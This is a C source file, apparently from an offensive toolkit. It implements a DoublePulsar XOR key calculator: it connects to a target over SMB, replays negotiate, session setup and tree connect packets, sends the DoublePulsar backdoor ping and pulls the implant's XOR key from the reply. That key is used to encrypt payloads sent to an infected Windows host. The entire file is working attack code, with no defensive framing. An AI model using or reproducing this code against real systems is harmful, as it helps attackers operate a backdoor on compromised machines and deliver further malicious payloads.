#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include "config.h"

extern SOCKET smb_connect(const char *ip, int port);

static int dp_send_all(SOCKET sock, const uint8_t *data, size_t length)
{
    size_t sent = 0;

    while (sent < length) {
        size_t remaining = length - sent;
        int chunk = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;
        int result = send(sock, (const char *)data + sent, chunk, 0);
        if (result == SOCKET_ERROR || result == 0)
            return -1;
        sent += (size_t)result;
    }

    return 0;
}

static int dp_recv_exact(SOCKET sock, uint8_t *data, size_t length)
{
    size_t received = 0;

    while (received < length) {
        size_t remaining = length - received;
        int chunk = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;
        int result = recv(sock, (char *)data + received, chunk, 0);
        if (result == SOCKET_ERROR || result == 0)
            return -1;
        received += (size_t)result;
    }

    return 0;
}

static int dp_recv_smb_response(SOCKET sock, uint8_t **response, size_t *response_length)
{
    uint8_t header[4];
    size_t payload_length;
    uint8_t *buffer;

    *response = NULL;
    *response_length = 0;

    if (dp_recv_exact(sock, header, sizeof(header)) != 0)
        return -1;

    payload_length = ((size_t)header[1] << 16) |
                     ((size_t)header[2] << 8) |
                     (size_t)header[3];
    if (payload_length > SIZE_MAX - sizeof(header))
        return -1;

    buffer = (uint8_t *)malloc(sizeof(header) + payload_length);
    if (buffer == NULL)
        return -1;

    memcpy(buffer, header, sizeof(header));
    if (payload_length != 0 &&
        dp_recv_exact(sock, buffer + sizeof(header), payload_length) != 0) {
        free(buffer);
        return -1;
    }

    *response = buffer;
    *response_length = sizeof(header) + payload_length;
    return 0;
}

unsigned int DoublePulsarXORKeyCalculator(const char *ip, int port)
{
    SOCKET sock;
    uint8_t negotiate[sizeof(SMB_NEGOTIATE_PKT) - 1];
    uint8_t session_setup[sizeof(SMB_SESSION_SETUP_PKT) - 1];
    uint8_t tree_connect[sizeof(SMB_TREE_CONNECT_PKT) - 1];
    uint8_t ping[sizeof(DP_PING_PKT) - 1];
    uint8_t *response = NULL;
    size_t response_length = 0;
    uint8_t tree_id[2];
    uint8_t user_id[2];
    unsigned int result = 0;

    if (ip == NULL || port < 1 || port > 65535)
        return 0;

    sock = smb_connect(ip, port);
    if (sock == INVALID_SOCKET)
        return 0;

    memcpy(negotiate, SMB_NEGOTIATE_PKT, sizeof(negotiate));
    if (dp_send_all(sock, negotiate, sizeof(negotiate)) != 0 ||
        dp_recv_smb_response(sock, &response, &response_length) != 0)
        goto cleanup;
    free(response);
    response = NULL;

    memcpy(session_setup, SMB_SESSION_SETUP_PKT, sizeof(session_setup));
    if (dp_send_all(sock, session_setup, sizeof(session_setup)) != 0 ||
        dp_recv_smb_response(sock, &response, &response_length) != 0)
        goto cleanup;
    if (response_length < 34)
        goto cleanup;
    user_id[0] = response[32];
    user_id[1] = response[33];
    free(response);
    response = NULL;

    memcpy(tree_connect, SMB_TREE_CONNECT_PKT, sizeof(tree_connect));
    tree_connect[32] = user_id[0];
    tree_connect[33] = user_id[1];
    if (dp_send_all(sock, tree_connect, sizeof(tree_connect)) != 0 ||
        dp_recv_smb_response(sock, &response, &response_length) != 0)
        goto cleanup;
    if (response_length < 34)
        goto cleanup;
    tree_id[0] = response[28];
    tree_id[1] = response[29];
    user_id[0] = response[32];
    user_id[1] = response[33];
    free(response);
    response = NULL;

    memcpy(ping, DP_PING_PKT, sizeof(ping));
    ping[28] = tree_id[0];
    ping[29] = tree_id[1];
    ping[32] = user_id[0];
    ping[33] = user_id[1];
    if (dp_send_all(sock, ping, sizeof(ping)) != 0 ||
        dp_recv_smb_response(sock, &response, &response_length) != 0)
        goto cleanup;

    if (SMB_RESP_SIGNATURE_END < SMB_RESP_SIGNATURE_START ||
        (size_t)SMB_RESP_SIGNATURE_END > response_length ||
        (size_t)SMB_RESP_SIGNATURE_START + 4 > response_length)
        goto cleanup;

    result = (unsigned int)response[SMB_RESP_SIGNATURE_START] |
             ((unsigned int)response[SMB_RESP_SIGNATURE_START + 1] << 8) |
             ((unsigned int)response[SMB_RESP_SIGNATURE_START + 2] << 16) |
             ((unsigned int)response[SMB_RESP_SIGNATURE_START + 3] << 24);

cleanup:
    free(response);
    closesocket(sock);
    return result;
}